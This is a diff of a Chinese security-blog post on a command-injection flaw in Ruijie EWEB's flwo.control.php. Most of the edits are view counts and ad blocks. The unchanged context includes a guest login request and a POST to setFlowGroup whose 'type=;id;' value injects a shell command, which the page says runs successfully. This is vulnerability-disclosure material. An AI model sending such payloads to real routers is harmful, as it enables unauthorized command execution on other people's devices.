@@ -7,7 +7,7 @@ asset_dir: assets/锐捷-eweb-flwo.control.php-命令注入漏洞
 # 锐捷-EWEB flwo.control.php 命令注入漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/4/30 08:25
-- 920浏览
+- 921浏览
 - [0评论](#comment)
 - 12分钟阅读
 
@@ -15,9 +15,9 @@ asset_dir: assets/锐捷-eweb-flwo.control.php-命令注入漏洞
 
 路由器
 
-SQL
-
 软件
+
+SQL
 
 ---
 
@@ -39,11 +39,11 @@ SQL
 
 深入探索
 
-服务器安全服务
-
 网络安全课程
 
-SQL注入防护
+授权
+
+代码安全审计
 
 看下 `flow_control_pi/flwo.control.php` 关键业务 `setFlowGroupAction` 逻辑的实现
 
@@ -74,17 +74,17 @@ Content-Type: application/x-www-form-urlencoded
 username=guest&password=guest?
 ```
 
-深入探索
-
-VPN服务
-
-云安全解决方案
-
-安全研究工具
-
 [![锐捷-EWEB flwo.control.php 命令注入漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)
 
 ## 命令注入
+
+深入探索
+
+数据库
+
+Web安全书籍
+
+安全研究报告
 
 ```
 POST /flow_control_pi/flwo.control.php?a=setFlowGroup HTTP/1.1
@@ -100,8 +100,6 @@ type=;id;
 [![锐捷-EWEB flwo.control.php 命令注入漏洞](images/img-002-48b9f9f0ce5b.webp)](https://image.mrxn.net/9cb43604f8564f30a6e11e4e44795028.webp)
 
 成功执行 `id` 命令并回显结果。
-
-漏洞预警服务
 
 - 标签：
 - [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
